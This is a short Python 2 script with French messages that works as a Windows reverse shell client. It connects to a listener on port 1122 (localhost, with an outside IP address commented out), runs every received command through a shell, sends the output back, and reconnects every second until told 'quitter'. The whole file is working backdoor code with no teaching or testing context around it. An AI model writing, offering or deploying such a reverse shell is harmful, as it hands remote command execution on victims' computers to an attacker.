import socket, subprocess, sys, os, time
from _winreg import *

# host = " 90.18.76.18"
host = "localhost"
port = 1122
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def recevCommand():
    while True:
        commande =  sock.recv(4096)
        if 'quitter' in commande:
            print 'Fermeture de la connexion'
            sock.close()
            break
        else:
            shell =  subprocess.Popen(commande, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            sock.send(shell.stdout.read() + shell.stderr.read())

def Connect():
    try:
        sock.connect((host, port))
        recevCommand()
    except Exception as e:
        print("something's wrong with %s:%d. Exception is %s" % (host, port, e))
    finally:
        print 'pas de co'
        # sock.close()


def Main ():
    while True:
        Connect()
        time.sleep(1)
Main()
